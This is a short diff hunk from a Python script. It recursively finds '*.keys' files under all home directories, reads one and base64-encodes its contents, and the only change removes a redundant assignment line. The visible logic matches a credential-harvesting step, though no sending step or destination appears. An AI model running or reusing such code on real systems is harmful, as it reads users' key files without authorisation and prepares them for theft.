@@ -10,8 +10,6 @@ import base64
 for filename in glob.iglob('/home/**/*.keys', recursive=True):
     print(filename)
 
-filename = filename
-
 fo = open(filename, "rb")
 filecontent = fo.read()
 encodedcontent = base64.b64encode(filecontent)
